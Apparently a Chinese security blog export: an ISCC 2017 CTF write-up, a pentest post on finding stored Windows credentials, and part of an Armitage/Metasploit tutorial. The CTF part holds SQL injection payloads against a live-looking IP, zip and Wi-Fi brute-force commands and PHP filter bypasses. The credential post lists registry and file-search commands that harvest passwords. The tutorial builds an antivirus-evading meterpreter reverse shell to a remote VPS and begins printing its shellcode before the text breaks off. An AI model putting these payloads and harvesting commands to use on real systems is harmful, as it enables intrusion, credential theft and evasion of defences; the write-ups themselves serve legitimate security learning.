    <content type="text"><![CDATA[CTF的启蒙ISCC-2017开始了。 BasicWheel Cipher附件链接： 密码：jgjk 题目就已经有提示了。是Wheel Cipher加密(轮密码)。 神秘图片附件链接： 密码：f7w7图片使用foremost工具分离，得出一张猪圈密码图 最后flag为goodluck 告诉你个秘密附件链接： 密码：4hv2这个题目说是简单的加密，结果出来的都是要解密。先对16进制转成字符串，观察字符串是base64加密的，再解密 得到12r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM 参照键盘。flag为：TONGYUAN 你猜猜。。附件链接： 密码：atys将16进制转字符，发现有pk字样。然后用HxD将这十六进制保存为zip。是一个加密的zip文件，猜123456弱口令得出flag。flag为daczcasdqwdcsdzasd 二维码附件链接： 密码：06wn扫描二维码提示说路由器密码为flag，二维图片使用foremost工具分离，得出一张图和一个zip。再对zip进行破解1fcrackzip -b -c &apos;1&apos; -l 1-10 -u crack_this.zip 密码为20161114,得到一个握手包和破解记录，然后写个脚本生成字典12345678a = open('11.txt','w')c="QWERTYUIOPASDFGHJKLZXcVBNM1234567890"for i in c: for ii in c: for iii in c: for iiii in c: cc='ISCC'+i+ii+iii+iiii a.write(cc+'\n') 既然是握手包，又是路由，那还是破解1aircrack-ng -w zidian.txt freedom-*.cap flag为ISCC16BA 说我作弊，需要证据附件链接： 密码：gey4这道题有原题：Creative Cheating [crypto] (150)) 公邮密码附件链接： 密码：beaj除了爆破还是爆破。fcrackzip -b -c &#39;A&#39; -l 1-3 -u crack_this.zip密码为BIT。TXT里面为RmxhZzp7THkzMTkuaTVkMWYqaUN1bHQhfQ==Flag:{Ly319.i5d1f*iCult!} PHP_encrypt_1附件链接： 密码：6aa4附件是一个加密脚本，那改一下就行了。12345678910111213141516171819202122232425&lt;?phpfunction decrypt()&#123; $key = md5('ISCC'); $data = base64_decode('fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='); $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i &lt; $len; $i++) &#123; $tmp = ord($data[$i]) - ord($char[$i]) + 128; $str .= chr($tmp &gt; 128 ? $tmp-128:$tmp); &#125; echo $str;&#125;decrypt();?&gt; 或者用python都没有问题的。flag为Flag:{asdqwdfasfdawfefqwdqwdadwqadawd} Misc眼见非实附件链接： 密码：4alx打开发现是个docx文档。既然是Misc题，那隐写跑不掉了，而且去年的那到毕业论文也是这样。但是这道题，在点开document.xml就见到flag。flag为flag{F1@g} 就在其中附件链接： 密码：nsue是一个流量包,丢到wireshark对流量包进行分析，发先是有FTP协议，那就转用NetworkMiner。 把四个文件提取出来，有RSA的公钥和私钥，还有个key.zip。 用私钥解就可以了。1openssl rsautl -decrypt -in key.txt -inkey test.key -out 1.txt flag为haPPy_Use_0penSsI 很普通的Disco附件链接： 密码：1w2d 大大音频，用Audacity打开。纵观全局没有那个地方是可疑的，那就再放大。 在最前面的发现了、高为1低为0。总共105个，分成15组每组7个。flag{W0W*funny} 很普通的数独附件：链接 密码：el7r以数独混淆，其实是将这25张图组成5*5的二维码。先把这三张图互换位置。补脚本：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#! /usr/bin/env python3# -*- coding: utf-8 -*-import pytesseractfrom PIL import Image, ImageDrawdef get_qr_list(): qr_list = list() for a in range(5 * 9): qr_list.append(list()) for b in range(5 * 9): qr_list[a].append(0) for e in range(5): for f in range(5): fname = '%s.png' % (e * 5 + f + 1) img = Image.open(fname).convert('L') sx, sy, ex, ey, tx = 0, 0, 0, 0, 2 for x in range(9): ty = 2 tx += 1 sx = x * 22 + tx + 1 for y in range(9): ty += 1 sy = y * 21 + ty + 1 ex, ey = sx + 20, sy + 19 img_temp = img.crop((sx, sy, ex, ey)) code = pytesseract.image_to_string(img_temp, config="-psm 5") if code!='': qr_list[f * 9 + x][e * 9 + y] = 1 print(qr_list[f * 9 + x][e * 9 + y], (x, y), (sx, sy, ex, ey), (e, f, x, y)) return qr_listdef get_qr_image(qr_list): img = Image.new('L', (10 * 47, 10 * 47), (255)) draw = ImageDraw.Draw(img) for e in range(5 * 9): for f in range(5 * 9): if qr_list[f][e]: draw.rectangle(((e + 1) * 10, (f + 1) * 10, (e + 2) * 10, (f + 2) * 10 ), fill=(0)) print(qr_list[f][e], ' ', end='') print() img.save('flag.png')if __name__ == '__main__': get_qr_image(get_qr_list()) 扫描得出1Vm0xd1NtUXlWa1pPVldoVFlUSlNjRlJVVGtOamJGWnlWMjFHVlUxV1ZqTldNakZIWVcxS1IxTnNhRmhoTVZweVdWUkdXbVZHWkhOWGJGcHBWa1paZWxaclpEUmhNVXBYVW14V2FHVnFRVGs9 flag为：flag{y0ud1any1s1} 再见李华附件链接： 密码：papu附件中是一张图片，foremost将zip提出来，打开需要密码。这个题目就略坑了，满满的都是脑洞，没有特殊字符，是指密码中没有特殊字符。而不少于1000个字，这个1000是8的二进制，所以密码是9位或9位以上，最后署名，意思是密码中后面5位数是Lihua。利用之前的脚本直接生成一个，但是fcrackzip抽风怎么都破解不出来。最后用Advanced ZIP Password Recovery_4.0进行破解。最后密码为15CCLiHua或者直接暴力破解吧，花的是时间。附脚本：flag为Stay hungry, Stay foolish. 寻”文”启事附件链接： 密码：tzli 从getflag.py来看，需要5个32位的字符串，从所有的文本文件中找出了13个，进行排列。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import reimport binasciifrom itertools import permutationsii = open('ii.txt','w')def fuc_1(): s = set() pattern = re.compile(r'[0-9a-f]&#123;32&#125;') for i in range(0, 6000): fname = './data/%s.txt' % i with open(fname, 'rt') as fs: tmp = fs.read() match = pattern.match(tmp) if match: s.add(match.group()) return sdef fuc_2(s): tmp = permutations(list(s), 5) for a, b, c, d, e in tmp: fuc_c(a, b, c, d, e)def fuc_c(a, b, c, d, e): Flag = '' File1_rc = binascii.unhexlify(a) File2_rc = binascii.unhexlify(b) File3_rc = binascii.unhexlify(c) File4_rc = binascii.unhexlify(d) File5_rc = binascii.unhexlify(e) for i in range(0,16): temp = ord(File1_rc[i]) + ord(File2_rc[i]) + ord(File3_rc[i]) + ord(File4_rc[i]) + ord(File5_rc[i]) Flag = Flag + chr((temp % 255)) jj = "Flag:&#123;" + binascii.hexlify(Flag)+ "&#125;" #print "Flag:&#123;" + binascii.hexlify(Flag) + "&#125;" print jj ii.write(jj+'\n')fuc_2(fuc_1()) 最后的结果为1287个，但是没有正确的flag，求hit。 WebWelcomeToMySQL测试后上传php5成功，查看源代码123456789101112131415161718192021222324&lt;?php if(isset($_FILES["file"]))&#123; if(preg_match("/\.php[2,3,4]$/",$_FILES["file"]["name"])) echo '&lt;script&gt;alert("You are a good man")&lt;/script&gt;'; else if(preg_match("/\.php$/",$_FILES["file"]["name"])) echo '&lt;script&gt;alert("You are a good man")&lt;/script&gt;'; else if(preg_match("/\.phtml$/",$_FILES["file"]["name"])) echo '&lt;script&gt;alert("phtml does not work ")&lt;/script&gt;'; else if($file=$_FILES["file"]["tmp_name"])&#123; move_uploaded_file($file, "/var/www/html/web-01/upload/".$_FILES["file"]["name"]); echo "uploaded successfully!"."&lt;br/&gt;"; echo '&lt;!--$servername,$username,$password,$db,$tb were set in base.php--&gt;'; echo "Your file stored in: "."upload/".$_FILES["file"]["name"]; &#125; &#125;?&gt;&lt;html&gt; &lt;body&gt; &lt;form action="index.php" method="post" enctype="multipart/form-data"&gt; file:&lt;input type="file" name="file" /&gt;&lt;br/&gt; &lt;input type="submit" name="submit" value="upload" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 确实就还剩下常规的php5和pht没有没被限制。根据提示的信息就是flag在数据库里面。用cat base.php读取配置从而进行连接。flag：Flag:{Iscc_1s_Fun_4nd_php_iS_Easy} 自相矛盾源码见到12345678910111213141516171819202122232425262728293031323334$v1=0;$v2=0;$v3=0;$a=(array)json_decode(@$_GET['iscc']); if(is_array($a))&#123; is_numeric(@$a["bar1"])?die("nope"):NULL; if(@$a["bar1"])&#123; ($a["bar1"]&gt;2016)?$v1=1:NULL; &#125; if(is_array(@$a["bar2"]))&#123; if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope"); $pos = array_search("nudt", $a["bar2"]); $pos===false?die("nope"):NULL; foreach($a["bar2"] as $key=&gt;$val)&#123; $val==="nudt"?die("nope"):NULL; &#125; $v2=1; &#125; &#125;$c=@$_GET['cat'];$d=@$_GET['dog'];if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; eregi("3|1|c",$d.$c[0])?die("nope"):NULL; strpos(($c[0].$d), "isccctf2017")?$v3=1:NULL; &#125; &#125;if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; echo $flag;&#125; 是有关弱类型的、弱类型的分析之前已经写过。 可以看出iscc是一个jason对象。bar1要求里边元素第一个比2016大而且不能是数字, 这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。 bar1为2017a即可bar2是一个数组，长度是5，里边第一个元素是数组。bar2为[[0],0,1,2,3]即可 而array和string进行strcmp比较的时候会返回一个null，%00可以截断eregi。cat[0]=00isccctf2017&amp;cat[1][]=1234&amp;dog=%00最后提交1?iscc=&#123;%22bar1%22:%222017e%22,%22bar2%22:[[1],1,2,3,0]&#125;&amp;cat[0]=00isccctf2017&amp;cat[1][]=1234&amp;dog=%00 flag为：flag{sfklljljdstuaft} I have a jpg,i upload a txt.代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121&lt;html&gt; &lt;body&gt; &lt;?php include 'hanshu.php'; if(isset($_GET['do'])) &#123; $do=$_GET['do']; if($do==upload) &#123; if(empty($_FILES)) &#123; $html1=&lt;&lt;&lt;HTML1 &lt;form action="index.php?do=upload" method="post" enctype="multipart/form-data"&gt; &lt;input type="file" name="filename"&gt; &lt;input type="submit" value="upload"&gt; &lt;/form&gt; HTML1; echo $html1; &#125; else &#123; $file=@file_get_contents($_FILES["filename"]["tmp_name"]); if(empty($file)) &#123; die('do you upload a file?'); &#125; else &#123; if((strpos($file,'&lt;?')&gt;-1)||(strpos($file,'?&gt;')&gt;-1)||(stripos($file,'php')&gt;-1)||(stripos($file,'&lt;script')&gt;-1)||(stripos($file,'&lt;/script')&gt;-1)) &#123; die('you can\' upload this!'); &#125; else &#123; $rand=mt_rand(); $path='/var/www/html/web-03/uploads/'.$rand.'.txt'; file_put_contents($path, $file); echo 'your upload success!./uploads/'.$rand.'.txt'; &#125; &#125; &#125; &#125; elseif($do==rename) &#123; if(isset($_GET['re'])) &#123; $re=$_GET['re']; $re2=@unserialize(base64_decode(unKaIsA($re,6))); if(is_array($re2)) &#123; if(count($re2)==2) &#123; $rename='txt'; $rand=mt_rand(); $fp=fopen('./uploads/'.$rand.'.txt','w'); foreach($re2 as $key=&gt;$value) &#123; if($key==0) &#123; $rename=$value; &#125; else &#123; if(file_exists('./uploads/'.$value.'.txt')&amp;&amp;is_numeric($value)) &#123; $file=file_get_contents('./uploads/'.$value.'.txt'); fwrite($fp,$file); &#125; &#125; &#125; fclose($fp); waf($rand,$rename); rename('./uploads/'.$rand.'.txt','./uploads/'.$rand.'.'.$rename); echo "you success rename!./uploads/$rand.$rename"; &#125; &#125; else &#123; echo 'please not hack me!'; &#125; &#125; elseif(isset($_POST['filetype'])&amp;&amp;isset($_POST['filename'])) &#123; $filetype=$_POST['filetype']; $filename=$_POST['filename']; if((($filetype=='jpg')||($filetype=='png')||($filetype=='gif'))&amp;&amp;is_numeric($filename)) &#123; $re=KaIsA(base64_encode(serialize(array($filetype,$filename))),6); header("Location:index.php?do=rename&amp;re=$re"); exit(); &#125; else &#123; echo 'you do something wrong'; &#125; &#125; else &#123; $html2=&lt;&lt;&lt;HTML2 &lt;form action="index.php?do=rename" method="post"&gt; filetype: &lt;input type="text" name="filetype" /&gt; please input the your file's type &lt;/br&gt; filename: &lt;input type="text" name="filename" /&gt; please input your file's numeric name,like 12345678 &lt;/br&gt; &lt;input type="submit" /&gt; &lt;/form&gt; HTML2; echo $html2; &#125; &#125; &#125; else &#123; show_source(__FILE__); &#125; ?&gt; &lt;/body&gt; &lt;/html&gt; 这道题就做得吐血了。 先来读一下代码 上传部分。1if((strpos($file,&apos;&lt;?&apos;)&gt;-1)||(strpos($file,&apos;?&gt;&apos;)&gt;-1)||(stripos($file,&apos;php&apos;)&gt;-1)||(stripos($file,&apos;&lt;script&apos;)&gt;-1)||(stripos($file,&apos;&lt;/script&apos;)&gt;-1)) 上传的里面不能包含有这一些参数，这里的办法就是拆开上传，比如是这样的。而接下来遇到的问题就是该如何合并这些参数。 rename部分123$re2=@unserialize(base64_decode(unKaIsA($re,6)))&gt;&gt;&gt;&gt;&gt;$re=KaIsA(base64_encode(serialize(array($filetype,$filename))),6); 要算出那个加密串才行。而相对应的解密脚本为1234567891011121314151617def main(string): # 获取凯撒位移6的加密内容 kaisa_6 = kaisa(string,6) # 获取凯撒位移20的加密内容 kaisa_20 = kaisa(string,20) code = "" for x in range(0,len(kaisa_6)): kaisa_6_ord = ord(kaisa_6[x]) kaisa_20_ord = ord(kaisa_20[x]) #判断凯撒位移20的是否是小写的值，是的话就加上 if kaisa_20_ord &gt;= 97 and kaisa_20_ord &lt;= 122: code += str(kaisa_20[x]) else: code += str(kaisa_6[x]) return code 卡住了。 大佬提示foreach是关键，又是一脸懵逼。再继续。这里就解决了开始分开上传的合并问题。最后flag为flag{54a5bd4fe6193580020487b56acff6c5}这道题主要还是这个加密的问题。exp地址链接 密码：7lcu最后附上一个比我这个好的writeup Web签到题，来和我换flag啊！ 根据提示来就可以了。flag为f1ag: {N0w_go1Odo!otherw3b} 我们一起来日站点击链接进去发现提示123老司机们平时都是怎么日站的呢？试着进入后台获取管理员权限吧。 看到老司机，那就先看下robots.txt。出现了里面这一串md5加密一看就是admin访问提示要继续寻找admin管理页面。猜测是admin.php，就出现了后台登陆页面、尝试弱口令，提示密码错误。尝试万能密码。flag为Flag:{ar32wefafafqw325t4rqfcafas} where is your flag使用sqlmap可以直接跑出来或者手工。1http://139.129.108.53:6980/web-08/?id=%df%27%20union%20select%201,unhex(hex(thisisflag))%20from%20flag%20limit%201--+ flag为flag:{441b7fa1617307be9632263a4497871e} Simple sqli是一个登陆框，这道题加了验证码。这种题目得常规的判断逻辑应该是1select username from admin where username=&apos;&apos;; 如果数据库中的密码和输入的密码一样则登陆成功然后尝试&#39;union select &#39;1&#39;#提示密码错误。再尝试最后payload为12&apos;union select md5(1)#密码填写1 关于验证码，ctf中经常用MD5的截断比较做验证，如:substr(md5(captcha), 0, 3)=’a85’,通过这种方式限制脚本的自动化攻击。12345678910&lt;?php@$demo=$_GET['demo'];$i=0;while(1) &#123;if (substr(md5($i), 0, 3)===$demo) &#123;echo $i;die;&#125;$i++;&#125;?&gt; python版本网上有的1234567#!/usr/bin/env pythonimport hashlibdef md5(s): return hashlib.md5(s).hexdigest()for i in range(1, 9999): if md5(str(i)).startswith(&apos;a85&apos;): print i 最后效果 select这道题刚做出来就被下架了，分数清零。题目本是反序列化的题目，但是可能是出题人头很铁.1http://139.129.108.53:5555/index.php?select=0 and 1=2 union select flag from selct&amp;time=1 这样就可以解出来了。 Moblie简单到不行附件链接： 密码：hd1q 这里使用 jeb 进行 APK 的反编译直接将 APK 拖入窗口左边的工程栏目 , 就会自动进行反编译根据对代码的分析可以知道 , 这个安卓应用有两个控件 ：一个 EditText 用于接收用户输入 , 另一个 Button 用于检验用户输入是否合法继续往下看发现应用要调用JNI层的函数 : checkFlag，再用IDA打开相关的so文件主要函数如下这里反编译成的 c 代码在有的地方似乎存在一点问题 , 如果发现某些地方比较诡异的话再回去看看汇编基本上就可以明白了。而在这个checkFlag函数中， 主要是将传入的字符串使用了 malloc 重新复制了一份算法的意思是 :将用户输入的字符串按照长度分割成两半把前一半字符串中的字符按照从左到右的顺序取出来 , ASCII码减去 5 , 然后与后半个字符串与之对应的位置进行交换举个例子 :1234567用户输入的字符串 str = &quot;8793245632&quot;分成两半 :前一半为 : &quot;87932&quot;后一半为 : &quot;45632&quot;对前一半的所有字符 , 从左向右取 , 第一个取到的是 8 , ASCII - 5 , 变成字符 3 , 然后与后半个字符串的对应位置 (也就是 &apos;2&apos; ) 的位置进行交换那么这一次变换得到的结果就是 :str = &quot;279324563&quot; 那么这个算法总结一下的话 , 其实可以这样理解 :首先将整个字符串倒序 , 然后将后半个字符串的每一个字符ASCII都减去 5再往下看。处理完用户输入的字符串的时候 , 进行的操作是 :将用户处理完的结果和程序中已经存在的一段数据逐字符进行对比 , 对比如果完全一致就返回 1 , 反之就 return 0 从so文件中找到字符串为1=0HWYl1SE5UQWFfN?I+PEo.UcshU 那我们就是先将这个密文倒序再将前半部分的ASCII码全部加上5。将得到的base64进行解密即可。 突破！征服!附件链接： 密码：7nx1 flag：6ae379eaf3ccada5 再来一次附件链接： 密码：20y5flag{ISCCXiaoTianShi} Reverse你猜附件链接： 密码：k3g0一度怀疑我这个IDA是假的，显示的不是main函数。。。（后来问了逆向大兄弟，是因为在编译时去掉了符号表，在高版本自带的sig信号文件可以识别出）从main函数来看，这个程序出现了两个验证。 验证 I在IDA中，使用R能快速的将ASCII码转换成字符串，所以V5至V14依次为l1nuxcrack而根据12345678for ( i = 0; i &lt;= 4; ++i )&#123; if ( *(_BYTE *)(*(_QWORD *)(a1 + 8) + i) != *(&amp;v5 + i) ) &#123; result = 1LL; goto LABEL_12; &#125;&#125; 这是对l1nux的验证12345678for ( j = 0; j &lt;= 4; ++j )&#123; if ( *(_BYTE *)(*(_QWORD *)(a1 + 16) + j) != *(&amp;v10 + j) ) &#123; result = 1LL; goto LABEL_12; &#125;&#125; 这是对crack的验证所以这部分代码可以断定第一个和第二个字符串分别为l1nux和crack 验证 II回过来对第二个验证分析，看一下函数和前面分析过的函数差别不大，只是 ASCII 码的判断 , 进行简单的加减法就可以推算出第三个 password 73,76,67,70,33==ILCF! flag{l1nux_crack_ILCF!} 小试牛刀附件链接： 密码：9305有点小幸运，直接看到了验证函数。再换算,将各个字符进行位置调整。flag{1t.is.5O.easy} 大杂烩附件链接： 密码：7ugp下载打开，是个EXE文件，估计着要脱壳。运行提示try again!，扔进IDA。然后就没然后了，等小伙伴分析分析。flag{thx_4_your_register} 顺藤摸瓜附件链接： 密码：bdgn老套路IDA F5大法。先一句一句来看吧s给的空间住够大，104个字符。fgets()函数是读取文件字符串，srand函数是随机数发生器的初始化函数。原型：void srand(unsigned int seed);在C语言中中，unsigned int类型数据所占字节数跟和机器字长及编译器有关系。这main函数主要是读取用户输入，类型转换作为随机数序列的种子，两次自定义的encode函数，最后输出encode结果。 encode112345678910111213141516171819202122size_t __fastcall sub_400796(const char *a1)&#123; size_t result; // rax@11 signed int i; // [sp+18h] [bp-18h]@1 signed int k; // [sp+18h] [bp-18h]@7 signed int j; // [sp+1Ch] [bp-14h]@2 for ( i = 0; i &lt;= 25; ++i ) &#123; for ( j = 0; j &lt;= 25; ++j ) *(&amp;byte_6010C0[26 * i] + j) = (i + j) % 26 + 97; &#125; for ( k = 0; ; ++k ) &#123; result = strlen(a1); if ( k &gt;= result ) break; if ( (*__ctype_b_loc())[a1[k]] &amp; 0x200 ) a1[k] = *(&amp;byte_6010C0[26 * ((a1[k] - 97) % 26)] + (byte_601070[(signed __int64)(k % 26)] - 97) % 26); &#125; return result;&#125; byte_6010C0的内容为空。byte_601070的内容为qwertyuiopaasdfghjklzxcvbnm而第一个for生成了一个表，第二个for是表对应位置加上一个数。 encode21234567891011121314151617181920212223242526272829303132333435363738__int64 __fastcall sub_400937(const char *a1)&#123; int v1; // eax@7 int v2; // ebx@8 char v4; // [sp+1Bh] [bp-F5h]@3 signed int i; // [sp+1Ch] [bp-F4h]@1 int j; // [sp+20h] [bp-F0h]@2 int v7; // [sp+24h] [bp-ECh]@1 unsigned int v8; // [sp+28h] [bp-E8h]@1 int v9; // [sp+2Ch] [bp-E4h]@1 char src[200]; // [sp+30h] [bp-E0h]@7 __int64 v11; // [sp+F8h] [bp-18h]@1 v11 = *MK_FP(__FS__, 40LL); v7 = 0; v8 = rand() % 7 + 2; v9 = strlen(a1) / (signed int)v8 + 1; for ( i = 0; i &lt; (signed int)v8; ++i ) &#123; for ( j = 0; j &lt; v9; ++j ) &#123; v4 = a1[v8 * j + i]; if ( (*__ctype_b_loc())[v4] &amp; 0x200 || v4 == 123 || v4 == 125 || v4 == 95 ) &#123; v1 = v7++; src[v1] = v4; &#125; else &#123; v2 = v7++; src[v2] = rand() % 26 + 97; &#125; &#125; &#125; src[v7] = 0; strcpy((char *)a1, src); return *MK_FP(__FS__, 40LL) ^ v11;&#125; 这个就不懂了。队友做。 exp地址链接 密码：6v9j flag{decrypt_game_is_very_very_interesting} 做Reverse最大的感受就是：当初怎么没把C语言给学好呢。 pwnpwn1附件链接： 密码：of1uexp链接： 密码：blfw pwn2附件链接： 密码：cgvpexp链接： 密码：z8xbflag{SF#PWN2Hd93DxnsE} 没有过程的不打算补了，好废时间。没有misc400的wp都不是好wp。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pentest中需要注意的本地凭证]]></title>
    <url>%2F2017%2F04%2FPentest%E4%B8%AD%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E6%9C%AC%E5%9C%B0%E5%87%AD%E8%AF%81%2F</url>
    <content type="text"><![CDATA[收集主机中的和密码凭证的相关内容 WindowsWindows 自动部署过程中的一些凭证（base64）存储位置12345C:\unattend.xmlC:\Windows\Panther\Unattend.xmlC:\Windows\Panther\Unattend\Unattend.xmlC:\Windows\system32\sysprep.infC:\Windows\system32\sysprep\sysprep.xml 使用 Metasploit 的post/windows/gather/enum_unattend模块也可以获取到 IIS 管理凭证的 web.config 文件常见路径：12C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.configC:\inetpub\wwwroot\web.config 文件内容示例：123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;configuration&gt;&lt;system.web&gt;&lt;authentication mode=&quot;Windows&quot;&gt;&lt;forms&gt;&lt;credentials passwordFormat=&quot;Clear&quot;&gt;&lt;user name=&quot;Admin&quot; password=&quot;Admin&quot; /&gt;&lt;/credentials&gt;&lt;/forms&gt;&lt;/authentication&gt;&lt;/system.web&gt;&lt;/configuration&gt; 包含密码的 groups.xml 文件12C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml\\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml 这个文件每个域用户都可以读取。文件中的密码是加密的，但是Microsoft已经发布了密钥，可以对其进行解密。 其他一些可能存储凭证的文件12345Services\Services.xmlScheduledTasks\ScheduledTasks.xmlPrinters\Printers.xmlDrives\Drives.xmlDataSources\DataSources.xml 命令使用命令查找包含密码的文件：123findstr /si password *.txtfindstr /si password *.xmlfindstr /si password *.ini 查找文件的位置：123456C:\&gt; dir /b /s unattend.xmlC:\&gt; dir /b /s web.configC:\&gt; dir /b /s sysprep.infC:\&gt; dir /b /s sysprep.xmlC:\&gt; dir /b /s *pass*C:\&gt; dir /b /s vnc.ini 第三方软件McAfee很多windows喜欢使用McAfee保护电脑，McAfee 的加密凭证存储在 sitelist.xml 文件中：1%AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml VNCUltraVNC1passwd=5FAEBBD0EF0A2413 RealVNCRealVNC 的密码可以直接在注册表进行查询：1reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password PuttyPUTTY的明文密码可以在下注册表项中查找：1reg query&quot; HKCU\Software\SimonTatham\PuTTY\Sessions&quot; 注册表Registry 某些情况下可能会包含凭证12reg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /s Windows 自动登陆：1reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; SNMP 相关参数：1reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot; PowerSploit 相关的模块PowerSploit 也可以用于发现存储的凭证，以下模块支持检查各种文件和注册表中的加密凭证和 plain-text：123456Get-UnattendedInstallFileGet-WebconfigGet-ApplicationHostGet-SiteListPasswordGet-CachedGPPPasswordGet-RegistryAutoLogon 参考：Stored Credentials]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>本地凭证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Armitage使用]]></title>
    <url>%2F2017%2F04%2Farmitage%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[一直想搞一波事情 初次使用armitage启动postgresql1service postgresql start 切换postgres用户1su postgres 输入命令创建一个postgresql数据库账户:1createuser msf1 -P 提示输入密码。 创建数据库owner参数指定数据库的所有者，最后一个参数为数据库名称。1createdb --owner=msf1 msf1 启动Metasploit1root@RcoIl:~# msfconsole 连接数据库1msf &gt; db_connect msf1:msf1@localhost/msf1 启动armitage 端口转发将vps上8888端口的流量转发到6665端口。而本地连接vps上的6665端口即可。 生成免杀exe1234567891011121314151617181920root@RcoIl:~# msfvenom -p windows/meterpreter/reverse_tcp LPORT=8888 LHOST=139.199.xxx.xxx -e x86/shikata_ga_nai -i 11 -f py -o /root/rcoil.pyNo platform was selected, choosing Msf::Module::Platform::Windows from the payloadNo Arch selected, selecting Arch: x86 from the payloadFound 1 compatible encodersAttempting to encode payload with 11 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 360 (iteration=0)x86/shikata_ga_nai succeeded with size 387 (iteration=1)x86/shikata_ga_nai succeeded with size 414 (iteration=2)x86/shikata_ga_nai succeeded with size 441 (iteration=3)x86/shikata_ga_nai succeeded with size 468 (iteration=4)x86/shikata_ga_nai succeeded with size 495 (iteration=5)x86/shikata_ga_nai succeeded with size 522 (iteration=6)x86/shikata_ga_nai succeeded with size 549 (iteration=7)x86/shikata_ga_nai succeeded with size 576 (iteration=8)x86/shikata_ga_nai succeeded with size 603 (iteration=9)x86/shikata_ga_nai succeeded with size 630 (iteration=10)x86/shikata_ga_nai chosen with final size 630Payload size: 630 bytesFinal size of py file: 3020 bytesSaved as: /root/rcoil.py 将生成得rcoil.py进行改写。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990from ctypes import *import ctypesbuf = &quot;&quot;buf += &quot;\xda\xc2\xb8\x5a\xb8\x23\x52\xd9\x74\x24\xf4\x5b\x2b&quot;buf += &quot;\xc9\xb1\x97\x31\x43\x1a\x83\xc3\x04\x03\x43\x16\xe2&quot;buf += &quot;\xaf\x63\xfc\x8b\x3b\xb0\xf7\x94\x6d\xde\x62\x60\x2a&quot;buf += &quot;\x36\x44\xd8\x5d\x79\x15\x0c\xde\x91\x65\x31\x0d\x10&quot;buf += &quot;\xe1\x47\xe7\x77\xc0\x18\xf7\x11\x54\xc4\x1b\x10\x6f&quot;buf += &quot;\xb3\xc4\xac\x3a\xc6\x0c\xf4\x4a\x39\x28\x85\x7f\xd7&quot;buf += &quot;\xc6\x28\x9d\xae\x34\x11\x7b\x59\x26\xb3\xbf\xca\xf7&quot;buf += &quot;\xa3\x77\x33\x9c\x9f\x29\x4b\xf9\xa7\x2f\x12\xfb\x2f&quot;buf += &quot;\xea\x3f\x22\xa2\x42\x5b\xc5\xc5\xb8\xda\x28\x03\x3a&quot;buf += &quot;\xf6\x3f\x8b\x43\x91\x73\x78\x38\x92\x99\x1b\x07\x2c&quot;buf += &quot;\x77\xe7\xde\xf3\xc4\xf9\x10\xfd\xae\x88\x00\xf2\x79&quot;buf += &quot;\xac\x2a\x07\x25\x96\xbd\x31\xe0\xff\xef\xc9\xc3\xea&quot;buf += &quot;\x3b\xcc\x0a\x00\x27\x43\xa4\x60\x1f\x3c\x5b\xc4\xa0&quot;buf += &quot;\x46\x65\xf1\xfc\x82\x8e\x10\x97\x1e\x05\x1e\x76\xae&quot;buf += &quot;\xc7\xe3\xad\xe0\x09\x5a\x0a\x2a\x04\x9e\x71\x86\x23&quot;buf += &quot;\xe0\x81\x63\x6f\x75\xca\xda\x24\x66\xbe\x4b\xb9\x3d&quot;buf += &quot;\x98\x78\xfe\xd8\x3c\x3c\x87\x3d\x61\x48\xc7\xf4\x67&quot;buf += &quot;\x59\x1e\x79\xf6\xf8\x71\xeb\x5a\xbb\x20\xb7\x2b\xd6&quot;buf += &quot;\x26\xf6\x77\x6d\xd4\x33\x90\x42\x9c\xff\xef\x44\xb7&quot;buf += &quot;\x1a\xec\x6a\xa6\x66\x6d\x1f\xaa\xdb\x84\x80\x68\xc4&quot;buf += &quot;\x47\x96\xf4\x09\x15\xff\x0f\xff\xb9\x0c\x8e\x5c\xbe&quot;buf += &quot;\x44\x93\xa4\x7c\xcd\x7f\x0c\x57\x24\xd4\x83\x89\xef&quot;buf += &quot;\x03\x80\x79\xfd\x83\x33\x85\x76\x50\xa8\xae\x17\x03&quot;buf += &quot;\x91\xc2\x66\x71\x72\x1e\x25\x35\x7d\xd7\x8b\x2c\xe5&quot;buf += &quot;\x57\xc9\xce\xb2\xaa\xe3\xbb\x71\xb5\x23\x45\xa3\x90&quot;buf += &quot;\xbb\xfb\xa0\x07\xaa\x1c\xf7\xd0\x34\x24\xa9\xb1\x8e&quot;buf += 